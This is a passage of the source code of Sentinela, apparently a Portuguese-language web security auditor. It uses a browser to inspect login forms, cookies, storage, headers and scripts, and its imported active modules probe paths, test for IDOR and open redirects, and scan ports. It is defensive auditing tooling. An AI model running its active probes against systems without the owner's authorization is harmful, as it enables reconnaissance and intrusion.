/**
 * Sentinela — Vulnerability Collector & Security Auditor (CLI: vulcoll)
 * 
 * Abre o navegador (visível) e coleta dados de segurança em 3 fases:
 *   FASE 1: Auditoria da página de LOGIN (antes de digitar qualquer coisa)
 *   FASE 2: Monitoramento em tempo real DURANTE o login (requests, tokens, storage changes)
 *   FASE 3: Auditoria pós-login (páginas autenticadas, crawl opcional)
 * 
 * Uso:
 *   node src/auditor.mjs https://seu-site.com
 *   node src/auditor.mjs https://seu-site.com --crawl
 *   node src/auditor.mjs https://seu-site.com --timeout 120
 */

import { chromium } from 'playwright';
import readline from 'readline';
import { writeFileSync, mkdirSync, existsSync, readFileSync, readdirSync } from 'fs';
import { join, dirname } from 'path';
import { fileURLToPath } from 'url';
import chalk from 'chalk';

import { analyzeStorage, analyzeCookies } from './rules/storage-rules.mjs';
import { analyzeSourceCode, analyzeInlineScripts } from './rules/code-rules.mjs';
import { analyzeHeaders, analyzeProtocol } from './rules/header-rules.mjs';
import { analyzeRequest, analyzeResponse } from './rules/network-rules.mjs';
import { classifyResource, isMinified, sameRegistrableDomain } from './rules/context-rules.mjs';
import { detectLibraries } from './rules/library-rules.mjs';
import { runActiveChecks, runIdorChecks } from './rules/active-rules.mjs';
import { mapFinding } from './rules/owasp-map.mjs';
import { runRecon, probePaths, diffAccessControl, testOpenRedirect, testBackupFiles, fingerprintFromCookies } from './rules/recon-rules.mjs';

// Novos módulos de infraestrutura (absorvidos do URL Checker)
import { scanTcpPorts } from './infra/tcp-scanner.mjs';
import { measureSocketTiming } from './infra/socket-timing.mjs';
import { measureLoadPercentiles } from './infra/load-percentiles.mjs';
import { lookupGeoIP } from './infra/geoip.mjs';
import { checkDnsblReputation } from './infra/dnsbl-reputation.mjs';
import { analyzeSocialCards } from './infra/social-cards.mjs';
import { analyzeDnsSecurity } from './infra/dns-scanner.mjs';

// Geradores de testes e verificação manual
import { generateTestArtifacts } from './generators/test-generator.mjs';
import { enrichWithVerification } from './generators/manual-verification.mjs';

// Novo sistema de relatório
import { computeScoreBreakdown } from './report/score-breakdown.mjs';
import { generateEnterpriseHtml } from './report/html-report.mjs';
import { generateEnterpriseMd } from './report/md-report.mjs';
import { exportPdf } from './report/pdf-export.mjs';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

// ─── Configuração Global ───────────────────────────────────

let args = process.argv.slice(2);
let targetUrl = args.find(a => a.startsWith('http'));
let shouldCrawl = args.includes('--crawl');
let activeMode = args.includes('--active');
let assumeYes = args.includes('--yes') || args.includes('-y');
let recordHar = !args.includes('--no-har');
let scope = null;
let loginTimeout = 300000;
let navIdleMs = 180000;

function parseConfiguration() {
  args = process.argv.slice(2);
  targetUrl = args.find(a => a.startsWith('http'));
  shouldCrawl = args.includes('--crawl');
  activeMode = args.includes('--active');
  assumeYes = args.includes('--yes') || args.includes('-y');
  recordHar = !args.includes('--no-har');

  const scopeArg = args.find(a => a.startsWith('--scope='));
  scope = scopeArg ? scopeArg.split('=')[1] : null;
  if (!scope && shouldCrawl) scope = 'crawl';
  if (!scope && args.includes('--navigate')) scope = 'navigate';
  if (!scope && args.includes('--login-only')) scope = 'login';
  if (!scope) scope = 'single';

  const timeoutArg = args.find(a => a.startsWith('--timeout'));
  loginTimeout = timeoutArg ? parseInt(timeoutArg.split('=')[1] || args[args.indexOf('--timeout') + 1]) * 1000 : 300000;

  const idleArg = args.find(a => a.startsWith('--idle'));
  navIdleMs = idleArg ? parseInt(idleArg.split('=')[1] || args[args.indexOf('--idle') + 1]) * 1000 : 180000;
}

if (!targetUrl) {
  console.log(chalk.red('\n❌ URL não informada!\n'));
  console.log(chalk.white('Uso:'));
  console.log(chalk.cyan('  node src/auditor.mjs https://seu-site.com'));
  console.log(chalk.cyan('  node src/auditor.mjs https://seu-site.com --crawl'));
  console.log(chalk.cyan('  node src/auditor.mjs https://seu-site.com --timeout 120'));
  console.log(chalk.gray('\nOpções:'));
  console.log(chalk.gray('  (sem flags)  Pergunta o escopo interativamente ao iniciar'));
  console.log(chalk.gray('  --scope=X    login | single | navigate | crawl'));
  console.log(chalk.gray('  --navigate   Navegação livre: audita cada página que você abrir'));
  console.log(chalk.gray('  --login-only Audita só a tela de login (não precisa logar)'));
  console.log(chalk.gray('  --crawl      Navegar por links internos automaticamente'));
  console.log(chalk.gray('  --timeout N  Tempo máximo em segundos (padrão: 300)'));
  console.log(chalk.gray('  --idle N     Navegação: para após N s sem página nova (padrão: 180)'));
  console.log(chalk.gray('  --active     Testes ATIVOS (métodos HTTP, security.txt, arquivos'));
  console.log(chalk.gray('               sensíveis). Só use com AUTORIZAÇÃO do dono do alvo.'));
  console.log(chalk.gray('  --no-har     Não gravar o arquivo HAR da sessão'));
  console.log(chalk.gray('  --yes / -y   Não perguntar nada, usar padrões/flags'));
  process.exit(1);
}

// ─── Estado Global ─────────────────────────────────────────

const allFindings = [];
const visitedUrls = new Set();
const networkFindings = [];
const loginPhaseNetworkFindings = []; // Findings de rede específicos do login
const mixedContentSeen = new Set();   // hosts http já reportados (evita spam)
const capturedRoutes = [];            // inventário de rotas/endpoints capturados
const seenRoutes = new Set();         // dedup de rotas (method + path)
const consoleMessages = [];           // mensagens de console (error/warning)
const pageErrors = [];                // exceções JS não tratadas
const browserIssues = [];             // findings vindos do painel Issues (CDP Audits)
const seenBrowserIssue = new Set();   // dedup de issues do navegador
const idorCandidates = [];            // URLs GET autenticadas com ID numérico
const seenIdor = new Set();
let lastNavActivity = 0;              // timestamp da última página nova (modo navegação)
const firstPartyAssets = [];         // URLs de JS/CSS do seu domínio (p/ backup guessing)
const seenAssets = new Set();
let reconCandidatePaths = [];         // paths do recon (robots/sitemap/dicionário)
let anonProbeResults = {};            // resultado anônimo do probe (p/ diff de acesso)
let infraData = null;                 // dados de infraestrutura (TCP, timing, GeoIP, etc.)
const auditScreenshots = [];          // screenshots das páginas (base64)
const auditTimeline = [];             // timeline de eventos
let pageHtmlContent = '';             // HTML da primeira página (para social cards)
let currentPhase = 'pre-login'; // 'pre-login' | 'login' | 'post-login'
let pageOrigin = '';

// ─── Session Hooks (injetados pelo daemon) ──────────────────
// Quando rodando via daemon, estes hooks gravam cada finding/rota/screenshot
// em disco imediatamente — garantindo que nada seja perdido em caso de crash.
let _sessionHooks = null;

/**
 * Configura hooks de sessão para persistência contínua em disco.
 * Chamado pelo daemon antes de iniciar a auditoria.
 * @param {object} hooks - { onFinding, onRoute, onScreenshot, onTimeline, onInfra, onBrowserDisconnect }
 */
export function setSessionHooks(hooks) {
  _sessionHooks = hooks;
}

// Wrapper de allFindings.push que também notifica o daemon
const _origFindingsPush = allFindings.push.bind(allFindings);
allFindings.push = function (...items) {
  const result = _origFindingsPush(...items);
  if (_sessionHooks?.onFinding) items.forEach(f => _sessionHooks.onFinding(f));
  return result;
};

// Wrapper de capturedRoutes.push que também notifica o daemon
const _origRoutesPush = capturedRoutes.push.bind(capturedRoutes);
capturedRoutes.push = function (...items) {
  const result = _origRoutesPush(...items);
  if (_sessionHooks?.onRoute) items.forEach(r => _sessionHooks.onRoute(r));
  return result;
};

/**
 * Exportação para uso pelo daemon.
 * Quando chamado diretamente (node auditor.mjs), usa o fluxo normal.
 * Quando importado pelo daemon, aceita hooks e finalizePromise.
 */
let activeFinalizePromise = null;

export async function runAudit(url, opts = {}, hooks = null, finalizePromise = null) {
  activeFinalizePromise = finalizePromise;
  // Mapear opções para flags CLI que o auditor.mjs reconhece
  if (url) process.argv[2] = url;

  // Escopo → flag correta
  if (opts.scope === 'login')    process.argv.push('--login-only');
  if (opts.scope === 'crawl')    process.argv.push('--crawl');
  if (opts.scope === 'navigate') process.argv.push('--navigate');
  // 'single' é o padrão, sem flag extra

  // Timeout: sentinela.mjs passa em minutos → converter para segundos para o auditor
  if (opts.timeoutMs) {
    const secs = Math.round(opts.timeoutMs / 1000);
    process.argv.push('--timeout', String(secs));
  }

  if (opts.activeMode) process.argv.push('--active');

  // Pular perguntas interativas — as respostas já vêm via opts
  process.argv.push('--yes');

  if (hooks) setSessionHooks(hooks);
  if (finalizePromise) {
    // Quando finalizePromise resolve, simular ENTER para desbloquear o readline
    finalizePromise.then(() => process.stdin.push('\n'));
  }

  await main();
}

// Snapshots para comparação before/after login
let storageSnapshotBefore = { localStorage: {}, sessionStorage: {} };
let cookieSnapshotBefore = [];

function addTimeline(text, type = 'info') {
  const time = new Date().toLocaleTimeString('pt-BR');
  auditTimeline.push({ time, text, type });
}

try {
  pageOrigin = new URL(targetUrl).origin;
} catch {
  console.log(chalk.red(`❌ URL inválida: ${targetUrl}`));
  process.exit(1);
}

// ─── Funções Auxiliares ────────────────────────────────────

function logFinding(finding) {
  const colors = {
    CRITICAL: chalk.bgRed.white.bold,
    HIGH: chalk.red.bold,
    MEDIUM: chalk.yellow,
    LOW: chalk.blue,
    INFO: chalk.gray,
  };
  const colorFn = colors[finding.severity] || chalk.white;
  const phaseTag = finding.phase ? chalk.magenta(`[${finding.phase}] `) : '';
  console.log(colorFn(`  ${phaseTag}[${finding.severity}] ${finding.label || finding.type}: ${finding.risk || finding.note || ''}`));
}

function logPhaseHeader(phase, emoji, title) {
  console.log(chalk.magenta.bold(`\n${'═'.repeat(60)}`));
  console.log(chalk.magenta.bold(`  ${emoji}  FASE: ${title}`));
  console.log(chalk.magenta.bold(`${'═'.repeat(60)}`));
}

function printBanner() {
  console.log(chalk.cyan.bold(`
╔══════════════════════════════════════════════════════════╗
║                                                          ║
║   ███████╗███████╗███╗   ██╗████████╗██╗███╗   ██╗       ║
║   ██╔════╝██╔════╝████╗  ██║╚══██╔══╝██║████╗  ██║       ║
║   ███████╗█████╗  ██╔██╗ ██║   ██║   ██║██╔██╗ ██║       ║
║   ╚════██║██╔══╝  ██║╚██╗██║   ██║   ██║██║╚██╗██║       ║
║   ███████║███████╗██║ ╚████║   ██║   ██║██║ ╚████║       ║
║   ╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝╚═╝  ╚═══╝       ║
║                    S E N T I N E L A                     ║
║        Vulnerability Collector · Security Auditor        ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
`));
}

// ─── Snapshot de Storage/Cookies ───────────────────────────

async function takeStorageSnapshot(page) {
  try {
    const storage = await page.evaluate(() => {
      const ls = {};
      const ss = {};
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        ls[key] = localStorage.getItem(key);
      }
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        ss[key] = sessionStorage.getItem(key);
      }
      return { localStorage: ls, sessionStorage: ss };
    });
    return storage;
  } catch {
    return { localStorage: {}, sessionStorage: {} };
  }
}

async function takeCookieSnapshot(page) {
  try {
    return await page.context().cookies();
  } catch {
    return [];
  }
}

function diffSnapshots(before, after, type) {
  const findings = [];

  // Chaves adicionadas
  const beforeKeys = Object.keys(before);
  const afterKeys = Object.keys(after);

  const added = afterKeys.filter(k => !beforeKeys.includes(k));
  const removed = beforeKeys.filter(k => !afterKeys.includes(k));
  const changed = afterKeys.filter(k => beforeKeys.includes(k) && before[k] !== after[k]);

  for (const key of added) {
    findings.push({
      type: 'login_storage_added',
      severity: 'INFO',
      phase: 'LOGIN',
      storage: type,
      key,
      valuePreview: maskValue(after[key]),
      valueLength: after[key]?.length || 0,
      note: `Login ADICIONOU "${key}" no ${type} (${after[key]?.length || 0} chars)`,
    });
  }

  for (const key of changed) {
    findings.push({
      type: 'login_storage_changed',
      severity: 'INFO',
      phase: 'LOGIN',
      storage: type,
      key,
      beforePreview: maskValue(before[key]),
      afterPreview: maskValue(after[key]),
      note: `Login ALTEROU "${key}" no ${type}`,
    });
  }

  for (const key of removed) {
    findings.push({
      type: 'login_storage_removed',
      severity: 'INFO',
      phase: 'LOGIN',
      storage: type,
      key,
      note: `Login REMOVEU "${key}" do ${type}`,
    });
  }

  return findings;
}

function diffCookies(before, after) {
  const findings = [];
  const beforeNames = before.map(c => c.name);
  const afterNames = after.map(c => c.name);

  const added = after.filter(c => !beforeNames.includes(c.name));
  const removed = before.filter(c => !afterNames.includes(c.name));

  for (const cookie of added) {
    const issues = [];
    if (!cookie.httpOnly) issues.push('httpOnly=false (acessível via JS)');
    if (!cookie.secure) issues.push('secure=false (trafega em HTTP)');
    if (!cookie.sameSite || cookie.sameSite === 'None') issues.push(`sameSite=${cookie.sameSite || 'não definido'} (vulnerável a CSRF)`);

    findings.push({
      type: 'login_cookie_added',
      severity: issues.length > 0 ? 'HIGH' : 'INFO',
      phase: 'LOGIN',
      cookieName: cookie.name,
      domain: cookie.domain,
      flags: {
        httpOnly: cookie.httpOnly,
        secure: cookie.secure,
        sameSite: cookie.sameSite,
        expires: cookie.expires > 0 ? new Date(cookie.expires * 1000).toISOString() : 'sessão',
      },
      issues,
      risk: issues.length > 0
        ? `Login criou cookie "${cookie.name}" com flags inseguras: ${issues.join(', ')}`
        : `Login criou cookie "${cookie.name}" (flags OK)`,
      recommendation: issues.length > 0
        ? 'Cookies de autenticação devem ter: httpOnly=true, secure=true, SameSite=Strict (ou Lax).'
        : undefined,
    });
  }

  for (const cookie of removed) {
    findings.push({
      type: 'login_cookie_removed',
      severity: 'INFO',
      phase: 'LOGIN',
      cookieName: cookie.name,
      note: `Login REMOVEU cookie "${cookie.name}"`,
    });
  }

  return findings;
}

function maskValue(value) {
  if (!value) return '(vazio)';
  if (value.length <= 8) return '***';
  return value.substring(0, 4) + '...' + value.substring(value.length - 4);
}

// ─── Auditoria Específica da Página de Login ──────────────

async function auditLoginPage(page, url) {
  console.log(chalk.cyan(`\n🔐 Auditando página de LOGIN: ${url}`));
  const findings = [];

  // 1. Análise profunda dos campos de formulário de login
  console.log(chalk.gray('  🔑 Analisando formulário de login...'));
  try {
    const loginFormFindings = await page.evaluate(() => {
      const findings = [];
      const forms = document.querySelectorAll('form');
      const allPasswordInputs = document.querySelectorAll('input[type="password"]');
      const allEmailInputs = document.querySelectorAll('input[type="email"], input[name*="email"], input[name*="user"], input[name*="login"], input[name*="usuario"]');

      // Se não tem form, mas tem inputs de senha → login via JS (sem form action)
      if (forms.length === 0 && allPasswordInputs.length > 0) {
        findings.push({
          type: 'login_no_form_tag',
          severity: 'INFO',
          phase: 'PRÉ-LOGIN',
          label: 'Login sem tag <form>',
          note: 'Login é feito via JavaScript sem tag <form>. Isso é comum em SPAs, mas verifique se os dados são enviados via HTTPS e POST.',
        });
      }

      forms.forEach((form, index) => {
        const hasPassword = form.querySelector('input[type="password"]');
        if (!hasPassword) return; // Não é formulário de login

        // === VERIFICAÇÕES DO FORM ===

        // 1. Form action — para onde os dados vão?
        const action = form.action || window.location.href;
        findings.push({
          type: 'login_form_action',
          severity: 'INFO',
          phase: 'PRÉ-LOGIN',
          label: 'Form action do login',
          formAction: action,
          formMethod: form.method || 'GET',
          note: `Formulário de login envia dados para: ${action} via ${(form.method || 'GET').toUpperCase()}`,
        });

        // 2. Method GET com senha = CRÍTICO
        if ((form.method || 'GET').toUpperCase() === 'GET') {
          findings.push({
            type: 'login_form_get',
            severity: 'CRITICAL',
            phase: 'PRÉ-LOGIN',
            label: 'Login via GET (senha na URL!)',
            risk: 'Formulário de login usa method GET! A senha aparecerá na URL, browser history, logs do servidor, proxy, e header Referer. Qualquer pessoa com acesso aos logs vê a senha.',
            recommendation: 'URGENTE: Mudar para method="POST". Nunca enviar senhas via GET.',
            attackExample: 'O histórico do navegador guardará: https://site.com/login?user=admin&password=123456. Qualquer pessoa com acesso ao computador verá a senha.',
          });
        }

        // 3. Form action via HTTP (não HTTPS)
        if (action.startsWith('http://') && !action.includes('localhost') && !action.includes('127.0.0.1')) {
          findings.push({
            type: 'login_form_http',
            severity: 'CRITICAL',
            phase: 'PRÉ-LOGIN',
            label: 'Login enviado via HTTP (sem criptografia)',
            risk: 'Credenciais de login são enviadas sem criptografia! Qualquer pessoa na mesma rede (WiFi, ISP) pode interceptar usuário e senha em texto puro.',
            recommendation: 'URGENTE: Usar HTTPS. Obter certificado TLS (Let\'s Encrypt é gratuito).',
            attackExample: 'Atacante na mesma WiFi usa Wireshark e vê: POST /login HTTP/1.1 → user=admin&password=SenhaSecreta',
          });
        }

        // 4. Sem CSRF token
        const csrfInput = form.querySelector('input[name*="csrf"], input[name*="_token"], input[name*="csrfmiddleware"], input[name*="authenticity_token"]');
        if (!csrfInput && (form.method || 'GET').toUpperCase() === 'POST') {
          findings.push({
            type: 'login_no_csrf',
            severity: 'MEDIUM',
            phase: 'PRÉ-LOGIN',
            label: 'Login sem CSRF token',
            risk: 'Formulário de login não tem token CSRF visível. Atacante pode criar página que faz login com credenciais que ele controla (login CSRF), fixando a sessão do atacante no navegador da vítima.',
            recommendation: 'Adicionar token CSRF no formulário de login. Se a app usa SPA com JWT, CSRF pode ser mitigado via SameSite cookies ou custom header.',
          });
        }

        // === VERIFICAÇÕES DOS INPUTS ===

        const passwordInputs = form.querySelectorAll('input[type="password"]');
        passwordInputs.forEach((input, pIdx) => {
          // 5. Input sem name (senha pode não ser enviada ou ter nome previsível)
          if (!input.name && !input.id) {
            findings.push({
              type: 'login_password_no_name',
              severity: 'LOW',
              phase: 'PRÉ-LOGIN',
              label: 'Campo de senha sem name/id',
              note: 'Campo de senha não tem atributo name nem id. Pode causar problemas no envio ou no gerenciador de senhas.',
            });
          }

          // 6. autocomplete em campo de senha
          const ac = input.autocomplete;
          if (!ac || (ac !== 'current-password' && ac !== 'new-password' && ac !== 'off')) {
            findings.push({
              type: 'login_password_autocomplete',
              severity: 'LOW',
              phase: 'PRÉ-LOGIN',
              label: 'Campo de senha sem autocomplete definido',
              inputName: input.name || input.id || `password-${pIdx}`,
              autocompleteValue: ac || '(não definido)',
              note: 'Recomendado: autocomplete="current-password" para login, "new-password" para cadastro. Ajuda gerenciadores de senha.',
            });
          }

          // 7. maxlength muito curto (limita senhas fortes)
          if (input.maxLength > 0 && input.maxLength < 64) {
            findings.push({
              type: 'login_password_maxlength',
              severity: 'MEDIUM',
              phase: 'PRÉ-LOGIN',
              label: `Senha com maxlength=${input.maxLength}`,
              risk: `Campo de senha limita a ${input.maxLength} caracteres. Isso impede o uso de senhas longas e seguras, e pode indicar que a senha é armazenada em texto puro (sem hash, que sempre tem tamanho fixo).`,
              recommendation: 'Remover maxlength ou aumentar para pelo menos 128. Senhas devem ser hasheadas (bcrypt/argon2), que tem tamanho fixo independente do input.',
            });
          }

          // 8. type="text" em campo que parece ser senha
          if (input.type !== 'password' && /pass|senha|pwd/i.test(input.name || input.id || '')) {
            findings.push({
              type: 'login_password_visible',
              severity: 'HIGH',
              phase: 'PRÉ-LOGIN',
              label: 'Campo de senha com type="text"',
              inputName: input.name || input.id,
              risk: 'Campo de senha está como type="text" — a senha é visível na tela. Pode ser vista por pessoas ao redor (shoulder surfing) e pode ser armazenada em autocomplete de texto.',
              recommendation: 'Usar type="password" para campos de senha.',
            });
          }
        });

        // 9. Campo de email/usuário — verificar se expõe informação
        const userInputs = form.querySelectorAll('input[type="email"], input[type="text"], input[name*="user"], input[name*="email"], input[name*="login"]');
        userInputs.forEach((input) => {
          if (input.autocomplete === 'off') {
            // OK, autocomplete desligado
          }
        });

        // 10. Botão de submit — verificar se tem proteção contra double-click
        const submitBtns = form.querySelectorAll('button[type="submit"], input[type="submit"], button:not([type])');
        if (submitBtns.length > 0) {
          // Verificar se algum botão tem disabled/loading state
          let hasProtection = false;
          submitBtns.forEach(btn => {
            if (btn.dataset.loading || btn.classList.contains('loading') || btn.disabled) {
              hasProtection = true;
            }
          });
          // Não reportar, apenas informativo
        }
      });

      // === VERIFICAÇÕES DE SEGURANÇA VISUAL ===

      // 11. Senha exposta em placeholder
      allPasswordInputs.forEach((input) => {
        if (input.placeholder && /\d{3,}|abc|123|senha|password|qwerty/i.test(input.placeholder)) {
          findings.push({
            type: 'login_password_example_placeholder',
            severity: 'LOW',
            phase: 'PRÉ-LOGIN',
            label: 'Placeholder com exemplo de senha fraca',
            placeholder: input.placeholder,
            note: `Placeholder "${input.placeholder}" sugere senhas fracas para o usuário. Usar algo como "Mínimo 8 caracteres" ao invés de exemplos de senha.`,
          });
        }
      });

      // 12. Links de "esqueci a senha" inseguros
      const forgotLinks = document.querySelectorAll('a[href*="forgot"], a[href*="reset"], a[href*="recover"], a[href*="esquec"]');
      forgotLinks.forEach(link => {
        if (link.href.startsWith('http://') && !link.href.includes('localhost')) {
          findings.push({
            type: 'login_forgot_password_http',
            severity: 'HIGH',
            phase: 'PRÉ-LOGIN',
            label: 'Link de recuperação de senha via HTTP',
            href: link.href,
            risk: 'Link de recuperação de senha não usa HTTPS. Token de reset pode ser interceptado.',
            recommendation: 'Toda a funcionalidade de recuperação de senha deve usar HTTPS.',
          });
        }
      });

      return findings;
    });

    if (loginFormFindings.length > 0) {
      console.log(chalk.yellow(`  ⚠️  ${loginFormFindings.length} achado(s) no formulário de login`));
      loginFormFindings.forEach(logFinding);
    }
    findings.push(...loginFormFindings);
  } catch (err) {
    console.log(chalk.red(`  ❌ Erro ao analisar formulário de login: ${err.message}`));
  }

  // 2. Auditoria completa da página (headers, scripts, storage, etc.)
  const pageFindings = await collectPageData(page, url);
  findings.push(...pageFindings.map(f => ({ ...f, phase: f.phase || 'PRÉ-LOGIN' })));

  return findings;
}

// ─── Coletores ─────────────────────────────────────────────

async function collectPageData(page, url) {
  console.log(chalk.cyan(`\n🔍 Auditando: ${url}`));
  const pageFindings = [];

  // 1. Coletar localStorage e sessionStorage
  console.log(chalk.gray('  📦 Coletando localStorage/sessionStorage...'));
  try {
    const storageData = await page.evaluate(() => {
      const ls = {};
      const ss = {};
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        ls[key] = localStorage.getItem(key);
      }
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        ss[key] = sessionStorage.getItem(key);
      }
      return { localStorage: ls, sessionStorage: ss };
    });

    const lsFindings = analyzeStorage(storageData.localStorage, 'localStorage');
    const ssFindings = analyzeStorage(storageData.sessionStorage, 'sessionStorage');

    if (lsFindings.length > 0) {
      console.log(chalk.yellow(`  ⚠️  ${lsFindings.length} problema(s) em localStorage`));
      lsFindings.forEach(logFinding);
    }
    if (ssFindings.length > 0) {
      console.log(chalk.yellow(`  ⚠️  ${ssFindings.length} problema(s) em sessionStorage`));
      ssFindings.forEach(logFinding);
    }

    pageFindings.push(...lsFindings, ...ssFindings);

    // Registrar todos os dados do storage (para referência)
    if (Object.keys(storageData.localStorage).length > 0) {
      pageFindings.push({
        type: 'storage_inventory',
        severity: 'INFO',
        storage: 'localStorage',
        keys: Object.keys(storageData.localStorage),
        url,
        note: `localStorage contém ${Object.keys(storageData.localStorage).length} chave(s): ${Object.keys(storageData.localStorage).join(', ')}`,
      });
    }
    if (Object.keys(storageData.sessionStorage).length > 0) {
      pageFindings.push({
        type: 'storage_inventory',
        severity: 'INFO',
        storage: 'sessionStorage',
        keys: Object.keys(storageData.sessionStorage),
        url,
        note: `sessionStorage contém ${Object.keys(storageData.sessionStorage).length} chave(s): ${Object.keys(storageData.sessionStorage).join(', ')}`,
      });
    }
  } catch (err) {
    console.log(chalk.red(`  ❌ Erro ao coletar storage: ${err.message}`));
  }

  // 2. Coletar cookies
  console.log(chalk.gray('  🍪 Coletando cookies...'));
  try {
    const cookies = await page.context().cookies();
    const cookieFindings = analyzeCookies(cookies, pageOrigin);

    if (cookieFindings.length > 0) {
      console.log(chalk.yellow(`  ⚠️  ${cookieFindings.length} problema(s) em cookies`));
      cookieFindings.forEach(logFinding);
    }

    pageFindings.push(...cookieFindings);

    // Inventário de cookies
    pageFindings.push({
      type: 'cookie_inventory',
      severity: 'INFO',
      cookies: cookies.map(c => ({
        name: c.name,
        domain: c.domain,
        httpOnly: c.httpOnly,
        secure: c.secure,
        sameSite: c.sameSite,
      })),
      url,
      note: `${cookies.length} cookie(s) encontrado(s)`,
    });
  } catch (err) {
    console.log(chalk.red(`  ❌ Erro ao coletar cookies: ${err.message}`));
  }

  // 3. Analisar código-fonte da página
  console.log(chalk.gray('  📜 Analisando código-fonte...'));
  try {
    const html = await page.content();

    // Analisar scripts inline (mesma origem da página = 1ª parte)
    const inlineFindings = analyzeInlineScripts(html, url, { thirdParty: false });
    if (inlineFindings.length > 0) {
      console.log(chalk.yellow(`  ⚠️  ${inlineFindings.length} problema(s) em scripts inline`));
      inlineFindings.forEach(logFinding);
    }
    pageFindings.push(...inlineFindings);

    // Analisar scripts externos carregados
    const scriptUrls = await page.evaluate(() => {
      return Array.from(document.querySelectorAll('script[src]'))
        .map(s => s.src)
        .filter(src => src && !src.includes('chrome-extension'));
    });

    for (const scriptUrl of scriptUrls) {
      try {
        const response = await page.evaluate(async (url) => {
          try {
            const res = await fetch(url);
            return await res.text();
          } catch {
            return null;
          }
        }, scriptUrl);

        if (response) {
          const { thirdParty, vendor } = classifyResource(scriptUrl, pageOrigin);
          const minified = isMinified(response, scriptUrl);
          const codeFindings = analyzeSourceCode(response, scriptUrl, { thirdParty, vendor, minified });

          // Tier 2: bibliotecas JS vulneráveis (por URL + assinatura no conteúdo)
          const libFindings = detectLibraries(scriptUrl, response, { thirdParty, vendor });

          const allScriptFindings = [...codeFindings, ...libFindings];
          if (allScriptFindings.length > 0) {
            const fpCount = allScriptFindings.filter(f => !f.thirdParty).length;
            const tag = thirdParty ? chalk.gray(`[3ª parte${vendor ? '/' + vendor : ''}]`) : chalk.white('[SEU]');
            console.log(chalk.yellow(`  ⚠️  ${allScriptFindings.length} achado(s) ${tag} em ${new URL(scriptUrl).pathname}${fpCount === 0 ? chalk.gray(' (todos de terceiro)') : ''}`));
            allScriptFindings.forEach(logFinding);
          }
          pageFindings.push(...allScriptFindings);
        }
      } catch {
        // Script inacessível
      }
    }
  } catch (err) {
    console.log(chalk.red(`  ❌ Erro ao analisar código-fonte: ${err.message}`));
  }

  // 4. Verificar protocolo
  const protocolFindings = analyzeProtocol(url);
  if (protocolFindings.length > 0) {
    protocolFindings.forEach(logFinding);
  }
  pageFindings.push(...protocolFindings);

  // 5. Analisar headers da página principal
  console.log(chalk.gray('  📋 Analisando headers de segurança...'));
  try {
    const response = await page.evaluate(async (pageUrl) => {
      try {
        const res = await fetch(pageUrl, { method: 'HEAD', credentials: 'same-origin' });
        const headers = {};
        res.headers.forEach((value, key) => { headers[key] = value; });
        return headers;
      } catch {
        return null;
      }
    }, url);

    if (response) {
      const headerFindings = analyzeHeaders(response, url);
      if (headerFindings.length > 0) {
        console.log(chalk.yellow(`  ⚠️  ${headerFindings.length} problema(s) em headers de segurança`));
        headerFindings.forEach(logFinding);
      }
      pageFindings.push(...headerFindings);

      // Tier 2: Cache-Control em página autenticada — dados sensíveis não devem
      // ficar em cache do disco/proxy.
      if (currentPhase === 'post-login') {
        const cc = (response['cache-control'] || '').toLowerCase();
        if (!/no-store/.test(cc)) {
          pageFindings.push({
            type: 'cache_control_sensitive',
            severity: 'MEDIUM',
            thirdParty: false,
            label: 'Página autenticada sem Cache-Control: no-store',
            header: 'Cache-Control',
            url,
            currentValue: cc || '(ausente)',
            risk: 'Página autenticada sem "no-store" pode ser armazenada em cache do navegador/proxy. Em computador compartilhado, alguém pode acessar o conteúdo via botão voltar mesmo após o logout.',
            recommendation: 'Em páginas autenticadas, enviar: Cache-Control: no-store, no-cache, must-revalidate e Pragma: no-cache.',
          });
        }
      }
    }
  } catch (err) {
    console.log(chalk.red(`  ❌ Erro ao analisar headers: ${err.message}`));
  }

  // 6. Verificar formulários inseguros
  console.log(chalk.gray('  📝 Verificando formulários...'));
  try {
    const formFindings = await page.evaluate(() => {
      const findings = [];
      const forms = document.querySelectorAll('form');

      forms.forEach((form, index) => {
        // Form sem action (pode enviar dados para URL atual)
        if (!form.action || form.action === window.location.href) {
          // OK se usar JS para submit
        }

        // Form com method GET e inputs sensíveis
        if (form.method.toUpperCase() === 'GET') {
          const sensitiveInputs = form.querySelectorAll('input[type="password"], input[name*="password"], input[name*="token"], input[name*="secret"], input[name*="cpf"]');
          if (sensitiveInputs.length > 0) {
            findings.push({
              type: 'form_get_sensitive',
              severity: 'HIGH',
              formIndex: index,
              action: form.action,
              method: 'GET',
              sensitiveFields: Array.from(sensitiveInputs).map(i => i.name || i.type),
              risk: 'Formulário envia dados sensíveis via GET. Dados aparecerão na URL, browser history, logs de servidor e header Referer.',
            });
          }
        }

        // Inputs de senha sem autocomplete=off (pode ser armazenado pelo navegador)
        const passwordInputs = form.querySelectorAll('input[type="password"]');
        passwordInputs.forEach(input => {
          if (input.autocomplete !== 'off' && input.autocomplete !== 'new-password' && input.autocomplete !== 'current-password') {
            findings.push({
              type: 'password_autocomplete',
              severity: 'LOW',
              formIndex: index,
              inputName: input.name || '(sem nome)',
              risk: 'Campo de senha pode ser auto-preenchido pelo navegador e armazenado em gerenciador de senhas sem consentimento.',
            });
          }
        });

        // Form sem CSRF token
        const csrfInput = form.querySelector('input[name*="csrf"], input[name*="_token"], input[name*="csrfmiddleware"]');
        if (!csrfInput && form.method.toUpperCase() === 'POST') {
          findings.push({
            type: 'form_no_csrf',
            severity: 'MEDIUM',
            formIndex: index,
            action: form.action,
            method: 'POST',
            note: 'Formulário POST sem token CSRF visível. Se o backend não valida CSRF via header ou cookie, está vulnerável a CSRF.',
          });
        }
      });

      return findings;
    });

    if (formFindings.length > 0) {
      console.log(chalk.yellow(`  ⚠️  ${formFindings.length} problema(s) em formulários`));
    }
    pageFindings.push(...formFindings);
  } catch (err) {
    console.log(chalk.red(`  ❌ Erro ao verificar formulários: ${err.message}`));
  }

  // 7. Verificar global variables expostas
  console.log(chalk.gray('  🌐 Verificando variáveis globais...'));
  try {
    const globalVarFindings = await page.evaluate(() => {
      const findings = [];
